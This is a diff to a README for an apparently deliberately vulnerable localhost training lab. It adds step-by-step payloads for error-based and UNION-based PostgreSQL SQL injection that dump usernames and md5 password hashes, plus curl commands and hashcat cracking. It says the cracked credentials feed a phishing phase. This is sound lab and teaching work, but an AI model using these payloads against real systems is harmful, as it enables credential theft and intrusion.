@@ -48,14 +48,41 @@ Requires `mod_cgid` loaded in `httpd.conf` so the `.py` CGI scripts execute.
 
 ## SQL injection — login (error-based)
 
-The login looks normal: it greets you on success and denies you on failure,
-and **never shows a user table**. But the DB prints raw errors, so you force
-an error that leaks the data. Put this in the **Keeper ID** field (any passphrase):
+The login looks normal: it greets you on success, denies you on failure, and
+**never shows a user table**. But the database prints raw errors, so you force
+PostgreSQL to put the data *inside* an error message. All payloads go in the
+**Keeper ID** field (passphrase: anything).
+
+Why it works: the query is
+`... WHERE username = '<you>' AND password_hash = md5('<pass>')`. If you make the
+engine convert text to a number, the conversion fails and the error echoes the
+offending text — so you fill that "text" with the data you want.
+
+**1. Confirm the error leak**
+```
+'
+```
+Breaks the query → `unterminated quoted string`. If you see the error, it's exploitable.
+
+**2. Prove the trick with something small (the version)**
+```
+' AND 1=CAST((SELECT version()) AS int)--
+```
+`invalid input syntax for type integer: "PostgreSQL 16.x ..."` — `CAST(text AS int)`
+cannot convert, so PostgreSQL shows the text it tried to convert.
+
+**3. Extract one user**
+```
+' AND 1=CAST((SELECT username FROM wardens LIMIT 1) AS int)--
+```
+Leaks `charon`.
+
+**4. Extract every user at once (the goal)**
 ```
 ' AND 1=CAST((SELECT string_agg(username||':'||password_hash, ', ') FROM wardens) AS int)--
 ```
-PostgreSQL throws `invalid input syntax for type integer: "charon:...,"` — every
-user leaked in the error message.
+`string_agg` joins all rows into one string; the CAST dumps it into the error.
+Every username and hash in a single message.
 
 With curl:
 ```bash
@@ -66,13 +93,57 @@ curl -s http://localhost/cgi-bin/login.py \
 
 Valid login (after cracking the hashes): `charon` / `ferryman`.
 
-## Admissions search (data extraction)
+## SQL injection — admissions search (UNION-based)
 
+The admissions page is a search that displays results, so UNION is realistic
+here: you append a second SELECT and its rows appear in the results table.
+Payloads go in the search box (or the `?q=` parameter).
+
+Why it works: the query is `... WHERE full_name ILIKE '%<q>%'`. You close the
+string and add `UNION SELECT`.
+
+**1. Baseline**
+```
+sisyphus
+```
+One matching soul.
+
+**2. Confirm injection**
+```
+'
+```
+Raw SQL error → exploitable.
+
+**3. Find the column count** (UNION needs the same number of columns)
+```
+zzz' UNION SELECT NULL, NULL, NULL--
+```
+Works with three NULLs; two or four raise "each UNION query must have the same
+number of columns". So the result has **3 columns**.
+
+**4. Dump the staff credentials**
+```
+zzz' UNION SELECT username, email, password_hash FROM wardens--
+```
+`full_name ILIKE '%zzz'` matches nothing; the UNION appends every warden row to
+the results table.
+
+With curl:
 ```bash
 curl -G "http://localhost/cgi-bin/admissions.py" --data-urlencode "q=sisyphus"
 curl -G "http://localhost/cgi-bin/admissions.py" \
   --data-urlencode "q=zzz' UNION SELECT username, email, password_hash FROM wardens--"
 ```
+
+## Cracking the hashes -> phishing
+
+The `password_hash` values are md5 of weak words (on purpose). Crack them offline:
+```bash
+# one hash per line in hashes.txt
+hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+```
+The recovered plaintext (e.g. `ferryman`) are the "harvested" credentials that
+feed the fake-login phishing phase (assessment phase 3).
 
 ## Notes
 
